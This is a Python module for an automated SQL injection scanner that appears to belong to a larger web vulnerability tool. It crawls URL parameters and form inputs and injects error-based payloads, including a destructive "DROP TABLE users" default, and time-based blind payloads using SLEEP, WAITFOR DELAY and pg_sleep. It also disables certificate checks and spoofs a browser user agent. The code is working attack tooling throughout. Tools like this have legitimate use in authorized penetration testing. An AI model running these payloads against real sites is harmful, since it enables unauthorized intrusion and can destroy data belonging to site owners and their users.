# For educational and authorized testing ONLY
# sql injection scanner
# does error-based and time-based blind detection
# owasp testing guide v4 stuff

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import os
import time


RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"
BOLD = "\033[1m"

# sql error strings to look for in responses
# organized by database type so we can tell what backend they're running
SQL_ERRORS = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "unclosed quotation mark",
        "mysql_num_rows()",
        "mysql_fetch_array()",
        "supplied argument is not a valid mysql",
    ],
    "PostgreSQL": [
        "pg_query()",
        "pg_exec()",
        "valid postgresql result",
        "unterminated quoted string",
        "syntax error at or near",
    ],
    "SQLite": [
        "sqlite3.operationalerror",
        "unrecognized token",
        "unable to open database",
        "sqlite_error",
        "sqlite.exception",
    ],
    "MSSQL": [
        "unclosed quotation mark after the character string",
        "incorrect syntax near",
        "sqlserver",
        "oledb",
        "microsoft sql",
    ],
    "Oracle": [
        "ora-01756",
        "ora-00933",
        "oracle error",
        "quoted string not properly terminated",
    ],
}


class SQLiScanner:
    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.findings = []
        self.payloads = self._load_payloads()

    def _load_payloads(self):
        """load sqli payloads from file"""
        payload_file = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                    "payloads", "sqli_payloads.txt")
        try:
            with open(payload_file, "r") as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            print(f"    Loaded {len(payloads)} SQLi payloads")
            return payloads
        except FileNotFoundError:
            print(f"    {RED}[-]{RESET} Payload file missing, using builtin defaults")
            return ["'", "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT NULL--"]

    def _check_sql_errors(self, response_text):
        """
        look for sql error messages in the response
        this is error-based detection - the easiest kind
        some WAFs strip these but lots of dev servers don't bother
        """
        response_lower = response_text.lower()
        for db_type, errors in SQL_ERRORS.items():
            for error in errors:
                if error in response_lower:
                    return db_type, error
        return None, None

    def _test_time_based(self, url, param_name, method="get", form_data=None):
        """
        time-based blind sqli - inject SLEEP and measure response time
        some WAFs block this one, and its slow, but its the most reliable
        for finding blind injection points
        """
        time_payloads = [
            "' OR SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--",  # mssql
            "' OR pg_sleep(3)--",           # postgres
            "1 OR SLEEP(3)",
        ]

        for payload in time_payloads:
            try:
                start_time = time.time()

                if method == "get":
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query, keep_blank_values=True)
                    params[param_name] = [payload]
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    self.session.get(test_url, timeout=15, verify=False)
                else:
                    data = dict(form_data) if form_data else {}
                    data[param_name] = payload
                    self.session.post(url, data=data, timeout=15, verify=False)

                elapsed = time.time() - start_time

                # if it took more than 2.5s, the sleep probably worked
                # not bulletproof but good enough for a basic scanner
                if elapsed >= 2.5:
                    return True, payload

            except requests.exceptions.Timeout:
                # timeout could also mean sleep worked
                return True, payload
            except Exception:
                pass

        return False, None

    def scan_url_params(self, url):
        """test each url parameter for sqli"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return

        print(f"\n    {BLUE}[*]{RESET} Testing SQLi on: {url}")

        for param_name in params:
            # try error-based first (faster)
            for payload in self.payloads:
                test_params = dict(params)
                test_params[param_name] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                try:
                    resp = self.session.get(test_url, timeout=10,
                                           verify=False, allow_redirects=True)

                    db_type, error_msg = self._check_sql_errors(resp.text)
                    if db_type:
                        finding = {
                            "type": "SQL Injection",
                            "severity": "CRITICAL",
                            "url": url,
                            "parameter": param_name,
                            "payload": payload,
                            "method": "GET",
                            "evidence": f"SQL error detected ({db_type}): {error_msg}",
                            "description": f'Error-based SQLi in parameter "{param_name}" ({db_type})',
                        }
                        self.findings.append(finding)
                        print(f"    {RED}{BOLD}[!!!] SQLi FOUND{RESET} - {db_type} error in: {param_name}")
                        break

                    time.sleep(0.2)

                except Exception:
                    pass

            # if error-based didn't find anything, try time-based
            already_found = any(f["parameter"] == param_name and f["url"] == url for f in self.findings)
            if not already_found:
                is_vuln, payload = self._test_time_based(url, param_name)
                if is_vuln:
                    finding = {
                        "type": "SQL Injection",
                        "severity": "CRITICAL",
                        "url": url,
                        "parameter": param_name,
                        "payload": payload,
                        "method": "GET",
                        "evidence": "Time-based blind SQLi detected (response delayed >2.5s)",
                        "description": f'Blind SQL injection in parameter "{param_name}"',
                    }
                    self.findings.append(finding)
                    print(f"    {RED}{BOLD}[!!!] BLIND SQLi{RESET} - time-based in: {param_name}")

    def scan_forms(self, forms):
        """test form inputs for sqli"""
        for form in forms:
            if not form["inputs"]:
                continue

            print(f"\n    {BLUE}[*]{RESET} Testing SQLi on form: {form['action']}")

            for inp in form["inputs"]:
                if inp["type"] not in ["text", "search", "email", "url", "hidden", "password", "textarea"]:
                    continue

                for payload in self.payloads:
                    form_data = {}
                    for field in form["inputs"]:
                        if field["name"] == inp["name"]:
                            form_data[field["name"]] = payload
                        else:
                            form_data[field["name"]] = field.get("value", "test")

                    try:
                        if form["method"] == "post":
                            resp = self.session.post(form["action"], data=form_data,
                                                    timeout=10, verify=False)
                        else:
                            resp = self.session.get(form["action"], params=form_data,
                                                   timeout=10, verify=False)

                        db_type, error_msg = self._check_sql_errors(resp.text)
                        if db_type:
                            finding = {
                                "type": "SQL Injection",
                                "severity": "CRITICAL",
                                "url": form["action"],
                                "parameter": inp["name"],
                                "payload": payload,
                                "method": form["method"].upper(),
                                "evidence": f"SQL error ({db_type}): {error_msg}",
                                "description": f'SQLi via form input "{inp["name"]}"',
                            }
                            self.findings.append(finding)
                            print(f"    {RED}{BOLD}[!!!] SQLi FOUND{RESET} - form input: {inp['name']}")
                            break

                        time.sleep(0.2)

                    except Exception:
                        pass

    def scan(self, crawl_results):
        """run the full sqli scan on everything the crawler found"""
        print(f"\n{BLUE}[*] Starting SQL injection scan...{RESET}")

        for page in crawl_results["urls"]:
            self.scan_url_params(page["url"])

        if crawl_results["forms"]:
            print(f"\n    Testing {len(crawl_results['forms'])} forms for SQLi...")
            self.scan_forms(crawl_results["forms"])

        if self.findings:
            print(f"\n{RED}[!!!] Found {len(self.findings)} potential SQL injection vulnerabilities{RESET}\n")
        else:
            print(f"\n{GREEN}[+] No SQL injection vulnerabilities found{RESET}\n")

        return self.findings
